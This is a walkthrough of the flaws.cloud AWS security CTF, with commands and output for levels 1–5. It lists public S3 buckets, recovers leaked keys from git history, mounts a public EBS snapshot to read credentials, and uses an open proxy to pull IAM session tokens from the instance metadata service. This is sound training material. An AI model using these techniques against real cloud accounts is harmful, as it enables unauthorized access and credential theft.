[{"content":"Hi Hackers Welcome Back ..\nToday we are going to look into flaws.cloud it is a set of CTF-like challenges that teach you common security issues in AWS accounts. The game is about breaking into a real AWS account by exploiting badly crafted account permissions. It has 6 levels, we are going to look one by one\nlet’s start with level 1.\nLevel 1 This level is buckets of fun. See if you can find the first sub-domain.\nNeed a hint? Visit Hint 1\nflaws.cloud is hosted on AWS which we found on Scope of this ctf . when you hear a name bucket in aws it refers to s3 storage bucket,\nlet us try to find subdomain we need to know about target domain ip and DNS records we are going to use tool called nslookup\nso what is nslookup ?\nnslookup is the name of a program that lets an Internet server administrator or any computer user enter a host name (for example, \u0026ldquo;whatis.com\u0026rdquo;) and find out the corresponding IP address or domain name system ( DNS ) record. The user can also enter a command for it to do a reverse DNS lookup and find the host name for an IP address that is specified\n1 2 3 4 5 6 7 8 9 10  ubuntu@ubuntu-2204:~$ nslookup flaws.cloud Server:\t127.0.0.53 Address:\t127.0.0.53#53 Non-authoritative answer: Name:\tflaws.cloud Address: 52.218.177.66 ubuntu@ubuntu-2204:~$ nslookup 52.218.177.66 66.177.218.52.in-addr.arpa\tname = s3-website-us-west-2.amazonaws.com.   we can now sure that the target domain is hosted on AWS s3 bucket and target ip belongs to s3-website-us-west-2.amazonaws.com domain\nthe web page flaws.cloud is hosted as a static website on S3 bucket in region “us-west-2”, which is region US West (Oregon). This is a great way to host a static site, similar to hosting one via github pages (our blog site is also hosted on github pages). Some interesting facts about S3 hosting: When hosting a site as an S3 bucket, the bucket name (flaws.cloud) must match the domain name (flaws.cloud). Also, S3 buckets are a global name space, meaning two people cannot have buckets with the same name. The result of this is you could create a bucket named microsoft.com and microsoft would never be able host their main site via S3 hosting.\nVisiting 52.218.177.66 the ip address on web, your browser will direct you to https://aws.amazon.com/s3/ So you know flaws.cloud is hosted as an S3 bucket.\nwe can then run:\n1 2 3 4  nslookup 52.218.177.66 # Returns: # Non-authoritative answer: # 255.184.231.54.in-addr.arpa name = s3-website-us-west-2.amazonaws.com   So we know it\u0026rsquo;s hosted in the AWS region us-west-2\nSide note (not useful for this game): All S3 buckets, when configured for web hosting, are given an AWS domain you can use to browse to it without setting up your own DNS. In this case, flaws.cloud can also be visited by going to http://flaws.cloud.s3-website-us-west-2.amazonaws.com/\nan AWS S3 static site, . A common misconfiguration for web servers is directory listing if it is misconfigured then unauthenticated users are granted permissions to list a bucket. This may reveal sensitive content, like the link to the next level.\nRegion and bucket name are enough to list the bucket. We use the AWS command line client for it. To make an unauthenticated request, use the flag “–no-sign-request”.\ninstall aws cli\n1 2 3 4 5 6 7 8 9 10 11 12 13  # For Debian and Ubuntu Devices apt install python-pip\t#python 2 apt install python3-pip\t#python 3 # For CentOS and RHEL # yum install epel-release # yum install python-pip # finally install the AWS CLI pip install awscli --upgrade --user # You can check the version by running aws --version   1 2 3 4 5 6 7 8  ubuntu@ubuntu-2204:~$ aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2 2017-03-13 23:00:38 2575 hint1.html 2017-03-02 23:05:17 1707 hint2.html 2017-03-02 23:05:11 1101 hint3.html 2020-05-22 14:16:45 3162 index.html 2018-07-10 12:47:16 15979 logo.png 2017-02-26 20:59:28 46 robots.txt 2017-02-26 20:59:30 1051 secret-dd02c7c.html   we can able to list some files from the list we can see that secret.html page lets try to see the content on that page\nNavigate to http://flaws.cloud/secret-dd02c7c.html\n1 2 3 4 5 6 7 8 9  _____ _ ____ __ __ _____ | || | / || |__| |/ ___/ | __|| | | o || | | ( \\_ | |_ | |___ | || | | |\\__ | | _] | || _ || ` \u0026#39; |/ \\| | | | || | | \\/ \\| |__| |_____||__|__| \\_/\\_/ \\___| Congrats! You found the secret file! Level 2 is at http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud   we got link to level 2\nLevel 2 The next level is fairly similar, with a slight twist. You\u0026rsquo;re going to need your own AWS account for this. You just need the free tier For hints, see Hint 1\nfor this level we need AWS account and IAM user, if you don’t have create it \nafter sign-up\n1 2 3 4 5 6 7 8 9  1. Open the IAM console. 2. In the navigation pane of the console, choose Users. 3. Choose your IAM user name (not the check box). 4. Choose the Security credentials tab and then choose Create access key. 5. To see the new access key, choose Show. Your credentials will look something like this: Access key ID: AKIA4********** Secret access key: iKllUgQDSJtYk************************* 6. To download the key pair, choose Download .csv file. Store the keys in a secure location. 7. Keep the keys confidential in order to protect your AWS account, and never email them. Do not share them outside your organization, even if an inquiry appears to come from AWS or Amazon.com. No one who legitimately represents Amazon will ever ask you for your secret key.   need to configure aws iam user credentials to aws cli\n1 2 3 4 5 6 7 8 9  ubuntu@ubuntu-2204:~$ aws configure AWS Access Key ID [None]: AKIA4********** AWS Secret Access Key [None]: iKllUgQDSJtYk************************* Default region name [None]: us-west-2 Default output format [None]: JSON   like previous level let’s we list if any directory\u0026rsquo;s available .\n1 2 3 4 5 6 7  ubuntu@ubuntu-2204:~$ aws s3 --profile default ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud 2017-02-26 21:02:15 80751 everyone.png 2017-03-02 22:47:17 1433 hint1.html 2017-02-26 21:04:39 1035 hint2.html 2017-02-26 21:02:14 2786 index.html 2017-02-26 21:02:14 26 robots.txt 2017-02-26 21:02:15 1051 secret-e4443fc.html   we got some files with that, the file name secret-file.html makes interest, let us dig into ```secret-e4443fc.html`` file\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  ubuntu@ubuntu-2204:~/Desktop$ curl http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;flAWS\u0026lt;/title\u0026gt; \u0026lt;META NAME=\u0026#34;ROBOTS\u0026#34; CONTENT=\u0026#34;NOINDEX, NOFOLLOW\u0026#34;\u0026gt; \u0026lt;style\u0026gt; body { font-family: Andale Mono, monospace; } :not(center) \u0026gt; pre { background-color: #202020; padding: 4px; border-radius: 5px; border-color:#00d000; border-width: 1px; border-style: solid;} \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body text=\u0026#34;#00d000\u0026#34; bgcolor=\u0026#34;#000000\u0026#34; style=\u0026#34;max-width:800px; margin-left:auto ;margin-right:auto\u0026#34; vlink=\u0026#34;#00ff00\u0026#34; link=\u0026#34;#00ff00\u0026#34;\u0026gt; \u0026lt;center\u0026gt; \u0026lt;pre \u0026gt; _____ _ ____ __ __ _____ | || | / || |__| |/ ___/ | __|| | | o || | | ( \\_ | |_ | |___ | || | | |\\__ | | _] | || _ || ` \u0026#39; |/ \\| | | | || | | \\/ \\| |__| |_____||__|__| \\_/\\_/ \\___| \u0026lt;/pre\u0026gt; \u0026lt;h1\u0026gt;Congrats! You found the secret file!\u0026lt;/h1\u0026gt; \u0026lt;/center\u0026gt; Level 3 is at \u0026lt;a href=\u0026#34;http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud\u0026#34;\u0026gt;http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud\u0026lt;/a\u0026gt;   we got Level 3 access\nLevel 3 The next level is fairly similar, with a slight twist. Time to find your first AWS key! I bet you\u0026rsquo;ll find something that will let you list what other buckets are. For hints, see Hint 1\nlike previous level let’s verify any directory listing is available or not\n1 2 3 4 5 6 7 8 9  ubuntu@ubuntu-2204:~/Desktop$ aws s3 --profile default ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ PRE .git/ 2017-02-26 19:14:33 123637 authenticated_users.png 2017-02-26 19:14:34 1552 hint1.html 2017-02-26 19:14:34 1426 hint2.html 2017-02-26 19:14:35 1247 hint3.html 2017-02-26 19:14:33 1035 hint4.html 2020-05-22 14:21:10 1861 index.html 2017-02-26 19:14:33 26 robots.txt   we got some list of hints but look carefully we got .git directory which makes some interest to look into it. for that let us download the directory\n1 2 3 4 5 6 7 8  ubuntu@ubuntu-2204:~/Desktop$ aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud . --no-sign-request --region us-west-2 download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint4.html to ./hint4.html download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/robots.txt to ./robots.txt download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint3.html to ./hint3.html download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/index.html to ./index.html download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint2.html to ./hint2.html download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint1.html to ./hint1.html download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/authenticated_users.png to ./authenticated_users.png   after installing git on our system. navigate to downloaded directory and type git log\n1 2 3 4 5 6 7 8 9 10 11 12  [atom@atom-virtualbox l3]$ git log commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -\u0026gt; master) Author: 0xdabbad00 \u0026lt;scott@summitroute.com\u0026gt; Date: Sun Sep 17 09:10:43 2017 -0600 Oops, accidentally added something I shouldn\u0026#39;t have commit f52ec03b227ea6094b04e43f475fb0126edb5a61 Author: 0xdabbad00 \u0026lt;scott@summitroute.com\u0026gt; Date: Sun Sep 17 09:10:07 2017 -0600 first commit   we can see that there ware two comments, while look into the second comment Oops, accidentally added something I shouldn't have he developer or targeted user added something which is definitely don\u0026rsquo;t want other peoples to see. the good and bad thing about git is a version control we can revert back to the previous version of the document. let us see the difference between this first and second comment versions.\n1 2 3 4 5 6 7 8 9 10  ubuntu@ubuntu-2204:~/Desktop/Flaws.cloud/ls - 3$ git diff f52ec03b227ea6094b04e43f475fb0126edb5a61 b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 diff --git a/access_keys.txt b/access_keys.txt deleted file mode 100644 index e3ae6dd..0000000 --- a/access_keys.txt +++ /dev/null @@ -1,2 +0,0 @@ -access_key AKIAJ366LIPB4IJKT7SA -secret_access_key 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 ubuntu@ubuntu-2204:~/Desktop/Flaws.cloud/ls - 3$   we can see that developer. had accidentally put Access_key and Secret_key of user\nusing this credentials let us create new profile f3\n1 2 3 4 5  ubuntu@ubuntu-2204:~/Desktop/Flaws.cloud/ls - 3$ aws configure --profile f3 AWS Access Key ID : AKIAJ366LIPB4IJKT7SA AWS Secret Access Key ]: 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 Default region name [default]: us-west-2 Default output format [JSON]: text   using Newly created profile f3 list buckets\n1 2 3 4 5 6 7 8 9 10 11 12  ubuntu@ubuntu-2204:~/Desktop/Flaws.cloud/ls - 3$ aws s3api list-buckets --profile f3 BUCKETS\t2020-06-25T17:43:56.000Z\t2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud BUCKETS\t2020-06-26T23:06:07.000Z\tconfig-bucket-975426262029 BUCKETS\t2020-06-27T10:46:15.000Z\tflaws-logs BUCKETS\t2020-06-27T10:46:15.000Z\tflaws.cloud BUCKETS\t2020-06-27T15:27:14.000Z\tlevel2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud BUCKETS\t2020-06-27T15:27:14.000Z\tlevel3-9afd3927f195e10225021a578e6f78df.flaws.cloud BUCKETS\t2020-06-27T15:27:14.000Z\tlevel4-1156739cfb264ced6de514971a4bef68.flaws.cloud BUCKETS\t2020-06-27T15:27:15.000Z\tlevel5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud BUCKETS\t2020-06-27T15:27:15.000Z\tlevel6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud BUCKETS\t2020-06-28T02:29:47.000Z\ttheend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud OWNER\t0xdabbad00\td70419f1cb589d826b5c2b8492082d193bca52b1e6a81082c36c993f367a5d73   all the challenges hosted on from this buckets. we got level 4 path\nLevel 4 For the next level, you need to get access to the web page running on an EC2 at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud\nIt\u0026rsquo;ll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it. Need a hint? Go to Hint 1\nif we visit the given link prompt asked to enter username and password. after performing brute forced and directory listing nothing worked, we know that the site is hosted in ubuntu on nginx server which is ec2 instance. question says the snapshot made after nginx was setup on it, if we found snapshot we can download and look into nginx config ware the passwords and configurations are stored.\n we can snapshot the disk volume of an EC2 as a backup. In this case, the snapshot was made public, but we will need to find it.\nTo do this, first we need the account ID, which we can get using the AWS key from the previous level:\n1 2  ubuntu@ubuntu-2204:~/Desktop$ aws --profile f3 sts get-caller-identity 975426262029\tarn:aws:iam::975426262029:user/backup\tAIDAJQ3H5DC3LEG2BKSLC   ware f3 is the profile 3 which is configured on previous level\nUsing that command also tells you the name of the account, which in this case is named \u0026ldquo;backup\u0026rdquo;. The backups this account makes are snapshots of EC2s. Next, discover the snapshot:\n1 2 3  ubuntu@ubuntu-2204:~/Desktop$ aws --profile f3 ec2 describe-snapshots --owner-id 975426262029 SNAPSHOTS\tFalse\t975426262029\t100%\tsnap-0b49342abd1bdcb89\t2017-02-28T01:35:12.000Z\tcompleted\tstandard\tvol-04f1c039bc13ea950\t8 TAGS\tName\tflaws backup 2017.02.27   We specify the owner-id just to filter the output. For fun, run that command without the owner-id and notice all the snapshots that are publicy readable. By default snapshots are private, and we can transfer them between accounts securely by specifiying the account ID of the other account, but a number of people just make them public and forget about them it seems.\nThis snapshot is in us-west-2 You\u0026rsquo;re going to want to look in that snapshot.\nNow that we know the snapshot ID, we need to mount it. we need to do this in our own AWS account, which you can get for free.\n it take some time to start instance. point your mouse on top of instance name right click and select connect\n you can able to see the connection steps\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  ubuntu@ubuntu-2204:~/Desktop$ sudo ssh -i \u0026#34;kp-l3.pem\u0026#34; ec2-user@ec2-34-216-207-4.us-west-2.compute.amazonaws.com The authenticity of host \u0026#39;ec2-34-216-207-4.us-west-2.compute.amazonaws.com (34.216.207.4)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:rffHg5EdntpsnKxGDZc7A4ZHhIKL/lOiV5ColbyKs7s. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;ec2-34-216-207-4.us-west-2.compute.amazonaws.com\u0026#39; (ED25519) to the list of known hosts. __| __|_ ) _| ( / Amazon Linux 2 AMI ___|\\___|___| https://aws.amazon.com/amazon-linux-2/ 2 package(s) needed for security, out of 5 available Run \u0026#34;sudo yum update\u0026#34; to apply all updates. [ec2-user@ip-172-31-33-178 ~]$   1 2 3 4 5 6 7 8 9 10 11  [ec2-user@ip-172-31-33-178 ~]$ lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT xvda 202:0 0 8G 0 disk └─xvda1 202:1 0 8G 0 part / xvdb 202:16 0 8G 0 disk └─xvdb1 202:17 0 8G 0 part [ec2-user@ip-172-31-33-178 ~]$ sudo file -s /dev/xvdb /dev/xvdb: x86 boot sector; partition 1: ID=0x83, active, starthead 0, startsector 16065, 16761118 sectors, code offset 0x63 [ec2-user@ip-172-31-33-178 ~]$ sudo mkdir /mnt/snapshot [ec2-user@ip-172-31-33-178 ~]$ sudo mount /dev/xvdb1 /mnt/snapshot/ [ec2-user@ip-172-31-33-178 ~]$   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  [ec2-user@ip-172-31-33-178 ~]$ cd /mnt/snapshot/ [ec2-user@ip-172-31-33-178 snapshot]$ ls bin boot dev etc home initrd.img initrd.img.old lib lib64 lost+found media mnt opt proc root run sbin snap srv sys tmp usr var vmlinuz vmlinuz.old [ec2-user@ip-172-31-33-178 snapshot]$ cd var/www/html/ [ec2-user@ip-172-31-33-178 html]$ ls index.html robots.txt [ec2-user@ip-172-31-33-178 html]$ cat index.html \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;flAWS\u0026lt;/title\u0026gt; \u0026lt;META NAME=\u0026#34;ROBOTS\u0026#34; CONTENT=\u0026#34;NOINDEX, NOFOLLOW\u0026#34;\u0026gt; \u0026lt;style\u0026gt; body { font-family: Andale Mono, monospace; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body text=\u0026#34;#00d000\u0026#34; bgcolor=\u0026#34;#000000\u0026#34; style=\u0026#34;max-width:800px; margin-left:auto ;margin-right:auto\u0026#34; vlink=\u0026#34;#00ff00\u0026#34; link=\u0026#34;#00ff00\u0026#34;\u0026gt; \u0026lt;center\u0026gt; \u0026lt;pre\u0026gt; _____ _ ____ __ __ _____ | || | / || |__| |/ ___/ | __|| | | o || | | ( \\_ | |_ | |___ | || | | |\\__ | | _] | || _ || ` \u0026#39; |/ \\| | | | || | | \\/ \\| |__| |_____||__|__| \\_/\\_/ \\___| \u0026lt;/pre\u0026gt; \u0026lt;h1\u0026gt;flAWS - Level 5\u0026lt;/h1\u0026gt; \u0026lt;/center\u0026gt; Good work getting in. This level is described at \u0026lt;a href=\u0026#34;http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/\u0026#34;\u0026gt;http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/\u0026lt;/a\u0026gt; [ec2-user@ip-172-31-33-178 html]$   we got level 5 access\nif we need password of the login, we already know the server of the site is nginx. the default password of the nginx is located on /etc/nginx/.htpasswd\n1 2 3  [ec2-user@ip-172-31-33-178 ~]$ cat /mnt/snapshot/etc/nginx/.htpasswd flaws:$apr1$4ed/7TEL$cJnixIRA6P4H8JDvKVMku0 [ec2-user@ip-172-31-33-178 ~]$   note the password is hashed\nInstead of going crazy on cracking it (which would fail) you can just look around a bit. What you will find is a setup script that generated the password file. It contains the password in clear text.\n1 2  [ec2-user@ip-172-31-33-178 /]$ cat /mnt/snapshot/home/ubuntu/setupNginx.sh htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M   let’s log in using username : flaws password: nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M\n lets we move to Level 5\nLevel 5 This EC2 has a simple HTTP only proxy on it. Here are some examples of it\u0026rsquo;s usage:\n http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/ http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/  See if you can use this proxy to figure out how to list the contents of the level6 bucket at level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud that has a hidden directory in it.\nNeed a hint? Go to Hint 1\nwe have level 6 url, while try to access we can see that Access Denied because level 6 is hosted on sub directory for that we need to play level 5 properly\n before that we already know what is APIPA  ip , while computer starts our computer waits less then 6 seconds for DHCP response. if DHCP server isn’t reachable. then the computer automatically assign ip with in the range of APIPA (169.254.0.1 to 169.254.255.254)\naws uses one of the ip address from APIPA range 169.254.169.254 for Retrieve instance metadata \nif we click the first link which they given\n1  [http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/)   according to aws documentation only access instance metadata and user data from within the instance itself, the data is not protected by authentication or cryptographic methods. Anyone who has direct access to the instance, and potentially any software running on the instance, can view its metadata. Therefore, you should not store sensitive data, such as passwords or long-lived encryption keys, as user data.\nusing metadata service ip lets try to fetch some information about target instance\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  buntu@ubuntu-2204:~/Desktop$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/ 1.0 2007-01-19 2007-03-01 2007-08-29 2007-10-10 2007-12-15 2008-02-01 2008-09-01 2009-04-04 2011-01-01 2011-05-01 2012-01-12 2014-02-25 2014-11-05 2015-10-20 2016-04-19 2016-06-30 2016-09-02 2018-03-28 2018-08-17 2018-09-24 2019-10-01 2020-10-27 2021-01-03 2021-03-23 2021-07-15   after searching some suspicious directory we have found aws key\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  latestubuntu@ubuntu-2204:~/Desktop$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/ dynamic meta-data user-dataubuntu@ubuntu-2204:~/Desktop$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/ ami-id ami-launch-index ami-manifest-path block-device-mapping/ events/ hostname iam/ identity-credentials/ instance-action instance-id instance-life-cycle instance-type local-hostname local-ipv4 mac metrics/ network/ placement/ profile public-hostname public-ipv4 public-keys/ reservation-id security-groups services/ubuntu@ubuntu-2204:~/Desktop$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam info security-credentials/ubuntu@ubuntu-2204:~/Desktop$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials\\ \u0026gt; ^C ubuntu@ubuntu-2204:~/Desktop$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials flawsubuntu@ubuntu-2204:~/Desktop$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/ { \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2022-05-24T12:58:01Z\u0026#34;, \u0026#34;Type\u0026#34; : \u0026#34;AWS-HMAC\u0026#34;, \u0026#34;AccessKeyId\u0026#34; : \u0026#34;ASIA6GG7PSQGQ7TEPAVL\u0026#34;, \u0026#34;SecretAccessKey\u0026#34; : \u0026#34;AV94C6SrOv16H1vbsrHmCu/pEVWBCuWtGT+Pgmjf\u0026#34;, \u0026#34;Token\u0026#34; : \u0026#34;IQoJb3JpZ2luX2VjEI3//////////wEaCXVzLXdlc3QtMiJIMEYCIQCEqt7ihjFqIL+clfFUGVUlUXq48ls5oFSAcwDO/NA2HQIhAJCVag13eXa2OdxHgsPlD7amM78frrg/sEIDPnYU3ChgKtIECHYQAhoMOTc1NDI2MjYyMDI5IgwcJjgItcBGb+d12xAqrwT+ir31XEYJuCr7JuNOrdFRRoSGo2ptgTHwa9v+c7Fq9FqzRxkvLiIflOFi3lqRJDnqVcU5K4vPedazvmaxNuB6SAg1B/Ky2pxo6krK3HpASIDjsqLUBrWOd5xqV4aLMVtQWtEX7+E7jsnSb/7hF3fctAh6isKKmkiyoIFi4WlZSiB5Pw4AOtisQEb+HHJ3/8gldY00jXLww1uK+i98/SJ6tkVSfv7K0VtL/0Ca1T1SUax8rBewKUWG5lAi/ayezhR4gQp8KJ7/Z+u+1Stet+HbNDgt9rEE7Cn4lQ+olRZFg31hiGckdiXBh3w6T0vdReh0ZYRqrlsO+3qZUeYzLM28aRFW54A6olsixnzzFABbeZ+v7CM90CNSAYIxE3hnf8QJsr41kK8a2thYgZKJs1wMIVE4DWb4ApiJ6rBL6uh7wDGuMAlrfBCoXcKpPnYfIDFmnM3p2f9Tut8S6l8DuYYzPYSd5d85rtDl9EJ+7kzcdqtZmVB5K39ZQTmYnIPRn5AVldwx9X0MNt0Pm0FDa5qQHBIH7m29SaQPr9oif6r6KyiRX+hHMCzO8Pw3clRIeeKJ8q30GKB0oSYUMOrsVuEqyGlczGsVPccXct0CzVkMGNW7LPeqioPZuKSl9CyKELVRgkSJKArR/f0zSfCAv6libMFDb34ddZP7LExGRjBwxVek02ROB22aHcOYUmp8WbBCzgdA4efaCB4/IMPzNPrazkewU/2aJ7Q/S9QN6wnNMKKss5QGOqgBaBx1ekIlITawdZ3PLRy7Ab+bLcFQq+EoUsA1yK+p7kPq9pdYSWxspq/F39hw+h+B0wUlfuSwO6STNGfUOHXnM0Ud0F/5fqCJoK9RrqpeXqtp/wkWygP4sR5pHy5zjJMO+0BLZmoNi0ISE+2o5ATOIaK8WHBCPlxJfGfsmE3OXjhPF3tK+v9zQJIvjGBDOcFNkYtSpD97xVXoe/f+SoqW2eSre8LijWLN\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2022-05-24T18:58:22Z\u0026#34; }ubuntu@ubuntu-2204:~/Desktop$   lets we configure profile using this credentials\n 💡 configure aws_session_token in **credentials** file which is located under ~/.aws/  1 2 3 4 5 6  [level6] aws_access_key_id = ASIA6GG7PSQGQ7TEPAV aws_secret_access_key = AV94C6SrOv16H1vbsrHmCu/pEVWBCuWtGT+Pgmjf aws_session_token = IQoJb3JpZ2luX2VjEI3//////////wEaCXVzLXdlc3QtMiJIMEYCIQCEqt7ihjFqIL+clfFUGVUlUXq48ls5oFSAcwDO/NA2HQIhAJCVag13eXa2OdxHgsPlD7amM78frrg/sEIDPnYU3ChgKtIECHYQAhoMOTc1NDI2MjYyMDI5IgwcJjgItcBGb+d12xAqrwT+ir31XEYJuCr7JuNOrdFRRoSGo2ptgTHwa9v+c7Fq9FqzRxkvLiIflOFi3lqRJDnqVcU5K4vPedazvmaxNuB6SAg1B/Ky2pxo6krK3HpASIDjsqLUBrWOd5xqV4aLMVtQWtEX7+E7jsnSb/7hF3fctAh6isKKmkiyoIFi4WlZSiB5Pw4AOtisQEb+HHJ3/8gldY00jXLww1uK+i98/SJ6tkVSfv7K0VtL/0Ca1T1SUax8rBewKUWG5lAi/ayezhR4gQp8KJ7/Z+u+1Stet+HbNDgt9rEE7Cn4lQ+olRZFg31hiGckdiXBh3w6T0vdReh0ZYRqrlsO+3qZUeYzLM28aRFW54A6olsixnzzFABbeZ+v7CM90CNSAYIxE3hnf8QJsr41kK8a2thYgZKJs1wMIVE4DWb4ApiJ6rBL6uh7wDGuMAlrfBCoXcKpPnYfIDFmnM3p2f9Tut8S6l8DuYYzPYSd5d85rtDl9EJ+7kzcdqtZmVB5K39ZQTmYnIPRn5AVldwx9X0MNt0Pm0FDa5qQHBIH7m29SaQPr9oif6r6KyiRX+hHMCzO8Pw3clRIeeKJ8q30GKB0oSYUMOrsVuEqyGlczGsVPccXct0CzVkMGNW7LPeqioPZuKSl9CyKELVRgkSJKArR/f0zSfCAv6libMFDb34ddZP7LExGRjBwxVek02ROB22aHcOYUmp8WbBCzgdA4efaCB4/IMPzNPrazkewU/2aJ7Q/S9QN6wnNMKKss5QGOqgBaBx1ekIlITawdZ3PLRy7Ab+bLcFQq+EoUsA1yK+p7kPq9pdYSWxspq/F39hw+h+B0wUlfuSwO6STNGfUOHXnM0Ud0F/5fqCJoK9RrqpeXqtp/wkWygP4sR5pHy5zjJMO+0BLZmoNi0ISE+2o5ATOIaK8WHBCPlxJfGfsmE3OXjhPF3tK+v9zQJIvjGBDOcFNkYtSpD97xVXoe/f+SoqW2eSre8LijWLN  ~   let us list directory using above credentials\n1 2 3 4  ubuntu@ubuntu-2204:~/.aws$ aws s3 --profile level6 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ PRE ddcc78ff/ 2017-02-26 21:11:07 871 index.html ubuntu@ubuntu-2204:~/.aws$   we have found sub directory. which helps to find level6 URL\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51  ubuntu@ubuntu-2204:~/.aws$ curl http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/ \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;flAWS - Level 6\u0026lt;/title\u0026gt; \u0026lt;META NAME=\u0026#34;ROBOTS\u0026#34; CONTENT=\u0026#34;NOINDEX, NOFOLLOW\u0026#34;\u0026gt; \u0026lt;style\u0026gt; body { font-family: Andale Mono, monospace; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body text=\u0026#34;#00d000\u0026#34; bgcolor=\u0026#34;#000000\u0026#34; style=\u0026#34;max-width:800px; margin-left:auto ;margin-right:auto\u0026#34; vlink=\u0026#34;#00ff00\u0026#34; link=\u0026#34;#00ff00\u0026#34;\u0026gt; \u0026lt;center\u0026gt; \u0026lt;pre\u0026gt; _____ _ ____ __ __ _____ | || | / || |__| |/ ___/ | __|| | | o || | | ( \\_ | |_ | |___ | || | | |\\__ | | _] | || _ || ` \u0026#39; |/ \\| | | | || | | \\/ \\| |__| |_____||__|__| \\_/\\_/ \\___| \u0026lt;/pre\u0026gt; \u0026lt;h1\u0026gt;flAWS - Level 6\u0026lt;/h1\u0026gt; \u0026lt;/center\u0026gt; \u0026lt;h3\u0026gt;Lesson learned\u0026lt;/h3\u0026gt; The IP address 169.254.169.254 is a magic IP in the cloud world. AWS, Azure, Google, DigitalOcean and others use this to allow cloud resources to find out metadata about themselves. Some, such as Google, have additional constraints on the requests, such as requiring it to use `Metadata-Flavor: Google` as an HTTP header and refusing requests with an `X-Forwarded-For` header. AWS has recently created a new IMDSv2 that requires special headers, a challenge and response, and other protections, but many AWS accounts may not have enforced it. If you can make any sort of HTTP request from an EC2 to that IP, you\u0026#39;ll likely get back information the owner would prefer you not see. \u0026lt;h4\u0026gt;Examples of this problem\u0026lt;/h4\u0026gt; 